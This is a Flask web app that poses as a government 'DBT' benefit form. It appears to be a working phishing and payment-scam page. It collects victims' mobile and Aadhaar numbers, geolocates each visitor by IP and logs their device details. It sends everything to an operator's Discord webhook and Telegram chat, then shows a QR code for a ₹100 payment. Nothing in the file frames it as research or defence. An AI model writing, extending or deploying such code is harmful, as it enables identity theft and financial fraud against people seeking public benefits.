from flask import Flask, request, render_template
import requests
from datetime import datetime
import pytz
from discord_logger import log_to_discord
from telegram_logger import log_to_telegram
from config import DISCORD_WEBHOOK, TELEGRAM_TOKEN, TELEGRAM_CHAT_ID

app = Flask(__name__)

def get_ip_info(ip):
    try:
        res = requests.get(f'https://ipapi.co/{ip}/json').json()
        return {
            'city': res.get('city'),
            'region': res.get('region'),
            'country': res.get('country_name'),
            'org': res.get('org')
        }
    except:
        return {}

def get_device_info(req):
    return {
        'user_agent': req.headers.get('User-Agent', 'Unknown'),
        'lang': req.headers.get('Accept-Language', 'Unknown'),
    }

@app.route('/', methods=['GET', 'POST'])
def home():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    tz = pytz.timezone('Asia/Kolkata')
    now = datetime.now(tz).strftime('%Y-%m-%d %H:%M:%S')
    info = get_ip_info(ip)
    device = get_device_info(request)

    if request.method == 'POST':
        mobile = request.form['mobile']
        aadhar = request.form['aadhar']
        aadhar_masked = aadhar[:4] + '-XXXX-' + aadhar[-4:]

        log_msg = f"""📥 DBT FORM SUBMISSION

📱 Mobile: {mobile}
🆔 Aadhar: {aadhar_masked}

🌍 IP: {ip} ({info.get('city')}, {info.get('region')}, {info.get('country')})
🏢 ISP: {info.get('org')}

📲 Device: {device['user_agent']}
🌐 Language: {device['lang']}
🕒 Time: {now}
💳 Payment: ₹100 Step Triggered (Assumed Paid)
"""

        log_to_discord(DISCORD_WEBHOOK, log_msg)
        log_to_telegram(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, log_msg)

        return render_template('index.html', show_qr=True)

    # Log visitor landing even if no submission
    visit_msg = f"""🧭 New Visitor Landed on Page

🌍 IP: {ip} ({info.get('city')}, {info.get('region')}, {info.get('country')})
📲 Device: {device['user_agent']}
🌐 Language: {device['lang']}
🕒 Time: {now}
"""
    log_to_discord(DISCORD_WEBHOOK, visit_msg)
    log_to_telegram(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, visit_msg)

    return render_template('index.html', show_qr=False)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, ssl_context=('cert.pem', 'key.pem'))